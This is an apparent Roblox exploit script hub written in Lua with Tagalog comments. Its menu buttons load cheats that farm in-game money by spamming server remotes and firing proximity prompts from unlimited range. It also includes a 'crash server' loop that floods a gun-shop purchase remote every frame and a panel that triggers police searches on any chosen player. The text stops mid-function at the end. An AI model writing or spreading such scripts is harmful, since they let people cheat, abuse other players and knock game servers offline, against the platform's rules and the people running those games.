addMainMenuButton("FANTASY ROLEPLAY AUTO FARM (WHITELISTED ONLY)", function()
	-- Updated: Whitelist using USERID (mas safe, hindi pwede baguhin)
-- LocalScript in StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

-- WHITELIST USERIDs (palitan mo ng totoong UserId ng mga gustong mag-load ng GUI)
-- Paano makakuha: Punta sa profile URL ng Roblox player → yung number (e.g. roblox.com/users/123456789/profile → 123456789)
local whitelistedUserIds = {
    4698920760,
    4698920760,     
    1905719523,
	3951685611,    
	7284709944,
}

local isWhitelisted = false
for _, userId in ipairs(whitelistedUserIds) do
    if player.UserId == userId then
        isWhitelisted = true
        break
    end
end

if not isWhitelisted then
    print("Not whitelisted (UserId: " .. player.UserId .. ")")
    return  -- Hindi maglo-load yung GUI
end

print(player.Name .. " is WHITELISTED (UserId: " .. player.UserId .. ")! GUI loaded! 🔥")

-- Lahat ng code sa baba ay pareho lang, walang binago sa GUI/functionality

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 180)
frame.Position = UDim2.new(0.5, -110, 0.5, -90)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 8)
title.BackgroundTransparency = 1
title.Text = "MONEY"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.Parent = frame

local moneyLabel = Instance.new("TextLabel")
moneyLabel.Size = UDim2.new(1, -20, 0, 25)
moneyLabel.Position = UDim2.new(0, 10, 0, 38)
moneyLabel.BackgroundTransparency = 1
moneyLabel.Text = "$0"
moneyLabel.TextColor3 = Color3.new(0, 1, 0)
moneyLabel.Font = Enum.Font.Roboto
moneyLabel.TextSize = 20
moneyLabel.TextXAlignment = Enum.TextXAlignment.Left
moneyLabel.Parent = frame

local autoButton = Instance.new("TextButton")
autoButton.Size = UDim2.new(0, 60, 0, 30)
autoButton.Position = UDim2.new(0, 10, 1, -68)
autoButton.BackgroundColor3 = Color3.new(0, 0, 0)
autoButton.BorderSizePixel = 1
autoButton.BorderColor3 = Color3.new(0.3, 0.3, 0.3)
autoButton.Text = "AUTO"
autoButton.TextColor3 = Color3.new(1, 1, 1)
autoButton.Font = Enum.Font.Roboto
autoButton.TextSize = 14
autoButton.Parent = frame

local autoBtnCorner = Instance.new("UICorner")
autoBtnCorner.CornerRadius = UDim.new(0, 8)
autoBtnCorner.Parent = autoButton

local cashButton = Instance.new("TextButton")
cashButton.Size = UDim2.new(0, 60, 0, 30)
cashButton.Position = UDim2.new(1, -70, 1, -68)
cashButton.BackgroundColor3 = Color3.new(0, 0, 0)
cashButton.BorderSizePixel = 1
cashButton.BorderColor3 = Color3.new(0.3, 0.3, 0.3)
cashButton.Text = "CASH"
cashButton.TextColor3 = Color3.new(1, 1, 1)
cashButton.Font = Enum.Font.Roboto
cashButton.TextSize = 14
cashButton.Parent = frame

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = cashButton

local toggleFrame = Instance.new("Frame")
toggleFrame.Size = UDim2.new(0, 50, 0, 25)
toggleFrame.Position = UDim2.new(0, 10, 1, -35)
toggleFrame.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
toggleFrame.Parent = frame

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 12)
toggleCorner.Parent = toggleFrame

local toggleButton = Instance.new("Frame")
toggleButton.Size = UDim2.new(0, 20, 0, 20)
toggleButton.Position = UDim2.new(0, 3, 0.5, -10)
toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)
toggleButton.Parent = toggleFrame

local toggleBtnCorner = Instance.new("UICorner")
toggleBtnCorner.CornerRadius = UDim.new(0, 10)
toggleBtnCorner.Parent = toggleButton

local toggleLabel = Instance.new("TextLabel")
toggleLabel.Size = UDim2.new(0, 80, 0, 25)
toggleLabel.Position = UDim2.new(0, 65, 1, -35)
toggleLabel.BackgroundTransparency = 1
toggleLabel.Text = "BoxEarning"
toggleLabel.TextColor3 = Color3.new(1, 1, 1)
toggleLabel.Font = Enum.Font.Roboto
toggleLabel.TextSize = 14
toggleLabel.TextXAlignment = Enum.TextXAlignment.Left
toggleLabel.Parent = frame

local dragging = false
local dragInput, dragStart, startPos

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

RunService.RenderStepped:Connect(function()
    if dragging and dragInput then
        local delta = dragInput.Position - dragStart
        frame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

local isOn = false
local toggleConnection

toggleFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isOn = not isOn
        if isOn then
            toggleButton.Position = UDim2.new(1, -23, 0.5, -10)
            toggleButton.BackgroundColor3 = Color3.new(0, 1, 0)
            toggleFrame.BackgroundColor3 = Color3.new(0.1, 0.4, 0.1)
            toggleConnection = RunService.Heartbeat:Connect(function()
                local args = {[1] = "BoxEarning"}
                pcall(function()
                    game:GetService("ReplicatedStorage"):WaitForChild("CityJobs", 9e9):WaitForChild("Jobs", 9e9):FireServer(unpack(args))
                end)
                task.wait(0.001)
            end)
        else
            toggleButton.Position = UDim2.new(0, 3, 0.5, -10)
            toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)
            toggleFrame.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
            if toggleConnection then
                toggleConnection:Disconnect()
                toggleConnection = nil
            end
        end
    end
end)

local autoEnabled = false
local autoConnection
local anotherBoxPrompt

task.spawn(function()
    anotherBoxPrompt = workspace:WaitForChild("Game", 30)
    if anotherBoxPrompt then
        anotherBoxPrompt = anotherBoxPrompt:WaitForChild("CityJobs", 30)
        if anotherBoxPrompt then
            anotherBoxPrompt = anotherBoxPrompt:WaitForChild("Prompts", 30)
            if anotherBoxPrompt then
                anotherBoxPrompt = anotherBoxPrompt:WaitForChild("AnotherBox", 30)
                if anotherBoxPrompt then
                    anotherBoxPrompt = anotherBoxPrompt:WaitForChild("ProximityPrompt", 30)
                    if anotherBoxPrompt then
                        anotherBoxPrompt.MaxActivationDistance = 1
                    end
                end
            end
        end
    end
end)

autoButton.MouseButton1Click:Connect(function()
    autoEnabled = not autoEnabled
    if autoEnabled then
        autoButton.BackgroundColor3 = Color3.new(0, 0.7, 0)
        autoButton.Text = "AUTO ON"

        if not anotherBoxPrompt then
            warn("AnotherBox prompt not found! Waiting...")
        end

        autoConnection = task.spawn(function()
            while autoEnabled do
                if anotherBoxPrompt then
                    pcall(fireproximityprompt, anotherBoxPrompt)
                end
                task.wait(12)
            end
        end)
    else
        autoButton.BackgroundColor3 = Color3.new(0, 0, 0)
        autoButton.Text = "AUTO"
        autoEnabled = false
        if autoConnection then
            task.cancel(autoConnection)
            autoConnection = nil
        end
    end
end)

-- CASH BUTTON
cashButton.MouseButton1Click:Connect(function()
    local args = {[1] = "BoxEarning"}
    pcall(function()
        game:GetService("ReplicatedStorage"):WaitForChild("CityJobs", 9e9):WaitForChild("Jobs", 9e9):FireServer(unpack(args))
    end)
end)

-- UPDATE MONEY LABEL
task.spawn(function()
    repeat task.wait() until player:FindFirstChild("leaderstats")
    local cash = player.leaderstats:FindFirstChild("Cash") or player.leaderstats:FindFirstChild("Money")
    if cash then
        cash.Changed:Connect(function()
            moneyLabel.Text = "$"..tostring(cash.Value)
        end)
        moneyLabel.Text = "$"..tostring(cash.Value)
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("MANUAL COMSERVE DOMINION WAIT 4 SEC (MONSY)", function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Enable instant interact for all prompts
for _, prompt in ipairs(workspace:GetDescendants()) do
    if prompt:IsA("ProximityPrompt") then
        prompt.HoldDuration = 0 -- make it instant
    end
end

-- Also catch new prompts that appear later
workspace.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("ProximityPrompt") then
        descendant.HoldDuration = 0
    end
end)

-- Optional: Auto-activate if you press E once near something
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.E then
        local char = LocalPlayer.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        for _, prompt in ipairs(workspace:GetDescendants()) do
            if prompt:IsA("ProximityPrompt") and prompt.Enabled then
                local dist = (prompt.Parent.Position - hrp.Position).Magnitude
                if dist < prompt.MaxActivationDistance then
                    fireproximityprompt(prompt)
                end
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO CONFISCATE GUI (MONSY)", function()
	--// SERVICES
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

--// REMOTE
local SearchRemote = ReplicatedStorage:WaitForChild("Police"):WaitForChild("Search")

--// MAIN GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.Name = ""

--// PLAYER LIST FRAME
local ListFrame = Instance.new("Frame")
ListFrame.Size = UDim2.new(0, 180, 0, 400)
ListFrame.Position = UDim2.new(0, 10, 0.5, -200)
ListFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
ListFrame.BorderSizePixel = 0
ListFrame.Parent = ScreenGui

Instance.new("UICorner", ListFrame).CornerRadius = UDim.new(0, 12)

local ListTitle = Instance.new("TextLabel")
ListTitle.Text = "PLAYERS ONLINE"
ListTitle.Font = Enum.Font.Roboto
ListTitle.TextSize = 16
ListTitle.TextColor3 = Color3.fromRGB(0,0,0)
ListTitle.BackgroundTransparency = 1
ListTitle.Size = UDim2.new(1, 0, 0, 35)
ListTitle.Parent = ListFrame

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Size = UDim2.new(1, -10, 1, -45)
ScrollingFrame.Position = UDim2.new(0, 5, 0, 40)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
ScrollingFrame.Parent = ListFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 4)
UIListLayout.Parent = ScrollingFrame

--// ADD PLAYER BUTTON
local playerButtons = {}

local function addPlayerToList(player)
	if playerButtons[player] then return end

	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -10, 0, 35)
	btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
	btn.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	btn.TextColor3 = Color3.fromRGB(0,0,0)
	btn.Font = Enum.Font.Roboto
	btn.TextSize = 14
	btn.TextXAlignment = Enum.TextXAlignment.Left
	btn.Parent = ScrollingFrame

	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)

	local padding = Instance.new("UIPadding")
	padding.PaddingLeft = UDim.new(0, 10)
	padding.Parent = btn

	btn.MouseButton1Click:Connect(function()
		if player.Character then
			SearchRemote:FireServer(player.Character)
		end
	end)

	playerButtons[player] = btn
end

local function removePlayerFromList(player)
	if playerButtons[player] then
		playerButtons[player]:Destroy()
		playerButtons[player] = nil
	end
end

for _, player in ipairs(Players:GetPlayers()) do
	addPlayerToList(player)
end

Players.PlayerAdded:Connect(addPlayerToList)
Players.PlayerRemoving:Connect(removePlayerFromList)

print("MONSY")

--// 🔥 KEYBIND: PRESS P TO SHOW/HIDE
local open = true

UIS.InputBegan:Connect(function(key, typing)
	if typing then return end
	if key.KeyCode == Enum.KeyCode.P then
		open = not open
		ListFrame.Visible = open
	end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("LUCIO CITY RP CRASH SERVER (MONSY)", function()
	-- LocalScript (ilagay sa StarterPlayerScripts)

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- WHITELIST (username o UserId) - idagdag mo lang ang mga allowed users dito
local WHITELIST = {
    ["Gian_Hitsdiff"] = true,          -- palitan mo ng username mo
    ["PeanutGaming_1"] = true,
    ["RIP_jeep"] = true,
	["Bluegotbanned5"] = true,          -- palitan mo ng username mo
    ["ranzkyle098123"] = true,
    ["X"] = true,
    -- Pwede ring UserId: [123456789] = true,
}

-- Check kung nasa whitelist ang player
local isWhitelisted = WHITELIST[player.Name] or WHITELIST[tostring(player.UserId)]

-- ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame (maliit, puti, rounded)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 140, 0, 90)
frame.Position = UDim2.new(0.5, -70, 0.5, -45)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.BackgroundTransparency = 0.001
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "LUCIO"
title.TextColor3 = Color3.fromRGB(30, 30, 30)
title.TextSize = 18
title.Font = Enum.Font.Roboto
title.TextXAlignment = Enum.TextXAlignment.Center
title.Parent = frame

-- On/Off Button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 100, 0, 40)
button.Position = UDim2.new(0.5, -50, 0.5, 0)
button.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
button.Text = "OFF"
button.TextColor3 = Color3.fromRGB(50, 50, 50)
button.Font = Enum.Font.Roboto
button.TextSize = 16
button.BorderSizePixel = 0

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 10)
btnCorner.Parent = button
button.Parent = frame

-- Kung HINDI whitelisted → i-disable ang button at mag-message
if not isWhitelisted then
    button.Text = "NO ACCESS"
    button.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
    button.TextColor3 = Color3.fromRGB(100, 100, 100)
    button.Active = false  -- hindi na makaklick
    button.AutoButtonColor = false
else
    -- Dragging (pwede pa ring i-drag kahit sino)
    local dragging, dragInput, dragStart, startPos

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)

    -- Auto-Buy Vector (KUNG whitelisted lang)
    local isOn = false
    local connection

    button.MouseButton1Click:Connect(function()
        if not isWhitelisted then return end  -- safety check

        isOn = not isOn
        
        if isOn then
            button.Text = "ON"
            button.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
            
            connection = game:GetService("RunService").Heartbeat:Connect(function()
                if isOn then
                    ReplicatedStorage.GunShop.Events.Purchase:FireServer("Vector", -0)
                end
            end)
        else
            button.Text = "OFF"
            button.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
            
            if connection then
                connection:Disconnect()
                connection = nil
            end
        end
    end)
end

-- Para hindi mawala kapag nag-reset
gui.IgnoreGuiInset = true
end)

--// 8 Buttons in Main Menu
addMainMenuButton("AFK COMSERV BETA TEST (MONSY)", function()
	local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- GLOBALS
_G.WalkEnabled = false
_G.TriggerEnabled = false

-- GUI SETUP — PURE WHITE + BLACK TEXT
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 240, 0, 180)
frame.Position = UDim2.new(0.5, -120, 0.5, -90)
frame.BackgroundColor3 = Color3.new(1, 1, 1)        -- WHITE NA
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 36)
title.Position = UDim2.new(0, 0, 0, 6)
title.BackgroundTransparency = 1
title.Text = "AUTO FARM"
title.TextColor3 = Color3.new(0,0,0)                -- BLACK TEXT
title.Font = Enum.Font.Roboto
title.TextSize = 20
title.Parent = frame

-- TOGGLE FUNCTION (WHITE THEME)
local function createToggle(name, posY, toggleVar)
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(0, 90, 0, 24)
	label.Position = UDim2.new(0, 16, 0, posY)
	label.BackgroundTransparency = 1
	label.Text = name
	label.TextColor3 = Color3.new(0,0,0)            -- BLACK TEXT
	label.Font = Enum.Font.Roboto
	label.TextSize = 15
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = frame

	local toggleFrame = Instance.new("Frame")
	toggleFrame.Size = UDim2.new(0, 56, 0, 28)
	toggleFrame.Position = UDim2.new(0, 168, 0, posY - 2)
	toggleFrame.BackgroundColor3 = Color3.fromRGB(230, 230, 230)  -- LIGHT GRAY OFF
	toggleFrame.Parent = frame

	local toggleCorner = Instance.new("UICorner")
	toggleCorner.CornerRadius = UDim.new(0, 14)
	toggleCorner.Parent = toggleFrame

	local toggleButton = Instance.new("Frame")
	toggleButton.Size = UDim2.new(0, 24, 0, 24)
	toggleButton.Position = UDim2.new(0, 4, 0.5, -12)
	toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)           -- WHITE KNOB
	toggleButton.Parent = toggleFrame

	local btnCorner = Instance.new("UICorner")
	btnCorner.CornerRadius = UDim.new(0, 12)
	btnCorner.Parent = toggleButton

	local enabled = false

	toggleFrame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			enabled = not enabled
			_G[toggleVar] = enabled

			if enabled then
				toggleButton.Position = UDim2.new(1, -28, 0.5, -12)
				toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)
				toggleFrame.BackgroundColor3 = Color3.fromRGB(100, 200, 100)  -- GREEN WHEN ON
				label.TextColor3 = Color3.fromRGB(0, 150, 0)
			else
				toggleButton.Position = UDim2.new(0, 4, 0.5, -12)
				toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)
				toggleFrame.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
				label.TextColor3 = Color3.new(0,0,0)
			end
		end
	end)
end

-- CREATE TOGGLES
createToggle("WALK", 56, "WalkEnabled")
createToggle("TRIGGER", 100, "TriggerEnabled")

-- DRAGGABLE (same)
local dragging, dragInput, dragStart, startPos = false

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

RunService.RenderStepped:Connect(function()
	if dragging and dragInput then
		local delta = dragInput.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- CLOSE BUTTON — WHITE + BLACK TEXT
local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 28, 0, 28)
close.Position = UDim2.new(1, -36, 0, 8)
close.BackgroundColor3 = Color3.new(1, 1, 1)        -- WHITE
close.BorderSizePixel = 1
close.BorderColor3 = Color3.new(0, 0, 0)            -- BLACK BORDER
close.Text = "X"
close.TextColor3 = Color3.new(0,0,0)                -- BLACK TEXT
close.Font = Enum.Font.Roboto
close.TextSize = 18
close.Parent = frame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 8)
closeCorner.Parent = close

close.MouseButton1Click:Connect(function()
	_G.WalkEnabled = false
	_G.TriggerEnabled = false
	screenGui:Destroy()
end)

-- CHARACTER & PARTS (same na same)
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local hrp = character:WaitForChild("HumanoidRootPart")

player.CharacterAdded:Connect(function(newChar)
	character = newChar
	humanoid = newChar:WaitForChild("Humanoid")
	hrp = newChar:WaitForChild("HumanoidRootPart")
end)

local folder = workspace:WaitForChild("ComService"):WaitForChild("CleanFolder")
local parts = {
	folder:GetChildren()[1],
	folder:GetChildren()[2],
	folder:GetChildren()[3],
	folder:GetChildren()[4],
	folder:GetChildren()[5]
}

-- WALK LOOP (exact same)
task.spawn(function()
	while true do
		task.wait()
		if not _G.WalkEnabled then continue end
		if not character or not character.Parent then continue end

		for i = 1, #parts do
			if not _G.WalkEnabled then break end
			local part = parts[i]
			if part and part:IsA("BasePart") then
				humanoid:MoveTo(part.Position)
				local reached = humanoid.MoveToFinished:Wait()
				if reached then
					task.wait(6)
				end
			end
		end
	end
end)

-- TRIGGER LOOP (exact same)
task.spawn(function()
	while true do
		task.wait()
		if not _G.TriggerEnabled then continue end
		if not character or not character.Parent then continue end

		for i = 1, #parts do
			if not _G.TriggerEnabled then break end
			local part = parts[i]
			if part and part:IsA("BasePart") then
				humanoid:MoveTo(part.Position)
				humanoid.MoveToFinished:Wait()
				task.wait(0.2)

				local prompt = part:FindFirstChild("ProximityPrompt")
				if prompt then
					fireproximityprompt(prompt)
				end
				task.wait(6)
			end
		end
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX FARM UNIVERSAL (MONSY)", function()
	-- LocalScript in StarterPlayerScripts

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

-- Main Frame — PURE WHITE
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 240, 0, 170)
frame.Position = UDim2.new(0.5, -120, 0.5, -85)
frame.BackgroundColor3 = Color3.new(1, 1, 1)        -- WHITE NA
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 8)
title.BackgroundTransparency = 1
title.Text = "JOB BOX"
title.TextColor3 = Color3.new(0,0,0)                -- BLACK TEXT
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.Parent = frame

-- Money Label
local moneyLabel = Instance.new("TextLabel")
moneyLabel.Size = UDim2.new(1, -20, 0, 25)
moneyLabel.Position = UDim2.new(0, 10, 0, 38)
moneyLabel.BackgroundTransparency = 1
moneyLabel.Text = "$0"
moneyLabel.TextColor3 = Color3.fromRGB(0, 170, 0)   -- GREEN PARA KITA PA RIN
moneyLabel.Font = Enum.Font.Roboto
moneyLabel.TextSize = 20
moneyLabel.TextXAlignment = Enum.TextXAlignment.Left
moneyLabel.Parent = frame

-- INSTANT Button — WHITE + BLACK TEXT
local instantButton = Instance.new("TextButton")
instantButton.Size = UDim2.new(0, 90, 0, 30)
instantButton.Position = UDim2.new(0, 10, 1, -68)
instantButton.BackgroundColor3 = Color3.new(1, 1, 1)    -- WHITE
instantButton.BorderSizePixel = 1
instantButton.BorderColor3 = Color3.new(0, 0, 0)        -- BLACK BORDER
instantButton.Text = "INSTANT"
instantButton.TextColor3 = Color3.new(0,0,0)            -- BLACK TEXT
instantButton.Font = Enum.Font.Roboto
instantButton.TextSize = 14
instantButton.Parent = frame

local instBtnCorner = Instance.new("UICorner")
instBtnCorner.CornerRadius = UDim.new(0, 8)
instBtnCorner.Parent = instantButton

-- PICK UP Button — WHITE + BLACK TEXT
local pickUpButton = Instance.new("TextButton")
pickUpButton.Size = UDim2.new(0, 90, 0, 30)
pickUpButton.Position = UDim2.new(1, -100, 1, -68)
pickUpButton.BackgroundColor3 = Color3.new(1, 1, 1)     -- WHITE
pickUpButton.BorderSizePixel = 1
pickUpButton.BorderColor3 = Color3.new(0, 0, 0)         -- BLACK BORDER
pickUpButton.Text = "PICK UP"
pickUpButton.TextColor3 = Color3.new(0,0,0)             -- BLACK TEXT
pickUpButton.Font = Enum.Font.Roboto
pickUpButton.TextSize = 14
pickUpButton.Parent = frame

local pickCorner = Instance.new("UICorner")
pickCorner.CornerRadius = UDim.new(0, 8)
pickCorner.Parent = pickUpButton

-- DROP Button — WHITE + BLACK TEXT
local dropButton = Instance.new("TextButton")
dropButton.Size = UDim2.new(0, 210, 0, 28)
dropButton.Position = UDim2.new(0.5, -105, 1, -35)
dropButton.BackgroundColor3 = Color3.new(1, 1, 1)       -- WHITE
dropButton.BorderSizePixel = 1
dropButton.BorderColor3 = Color3.new(0, 0, 0)           -- BLACK BORDER
dropButton.Text = "DROP"
dropButton.TextColor3 = Color3.new(0,0,0)               -- BLACK TEXT
dropButton.Font = Enum.Font.Roboto
dropButton.TextSize = 14
dropButton.Parent = frame

local dropCorner = Instance.new("UICorner")
dropCorner.CornerRadius = UDim.new(0, 8)
dropCorner.Parent = dropButton

-- DRAGGING (same na same)
local dragging = false
local dragInput, dragStart, startPos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

RunService.RenderStepped:Connect(function()
	if dragging and dragInput then
		local delta = dragInput.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- PICK UP AUTO
local autoPick = false
local pickPrompt = workspace.DeliveryJob.BoxPickingJob.PickupBox.PickupPrompt
pickPrompt.MaxActivationDistance = math.huge

pickUpButton.MouseButton1Click:Connect(function()
	autoPick = not autoPick
	if autoPick then
		pickUpButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)  -- GREEN KAPAG ON
		pickUpButton.Text = "PICK UP ON"
		task.spawn(function()
			while autoPick do
				pcall(fireproximityprompt, pickPrompt)
				task.wait(0.001)
			end
		end)
	else
		pickUpButton.BackgroundColor3 = Color3.new(1, 1, 1)
		pickUpButton.Text = "PICK UP"
	end
end)

-- DROP AUTO
local autoDrop = false
local dropPrompt = workspace.DeliveryJob.BoxPickingJob.Job.Part.ProximityPrompt
dropPrompt.MaxActivationDistance = math.huge

dropButton.MouseButton1Click:Connect(function()
	autoDrop = not autoDrop
	if autoDrop then
		dropButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)    -- GREEN KAPAG ON
		dropButton.Text = "DROP ON"
		task.spawn(function()
			while autoDrop do
				pcall(fireproximityprompt, dropPrompt)
				task.wait(0.001)
			end
		end)
	else
		dropButton.BackgroundColor3 = Color3.new(1, 1, 1)
		dropButton.Text = "DROP"
	end
end)

-- INSTANT PRESS E
instantButton.MouseButton1Click:Connect(function()
	for _, prompt in ipairs(workspace:GetDescendants()) do
		if prompt:IsA("ProximityPrompt") then
			prompt.HoldDuration = 0
		end
	end
	instantButton.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
	task.wait(0.2)
	instantButton.BackgroundColor3 = Color3.new(1, 1, 1)
end)

-- UPDATE MONEY
task.spawn(function()
	repeat task.wait() until player:FindFirstChild("leaderstats")
	local cash = player.leaderstats:FindFirstChild("Cash") or player.leaderstats:FindFirstChild("Money")
	if cash then
		moneyLabel.Text = "$"..cash.Value
		cash.Changed:Connect(function()
			moneyLabel.Text = "$"..cash.Value
		end)
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("UNIVERSAL NO FALL DAMAGE (MONSY)", function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
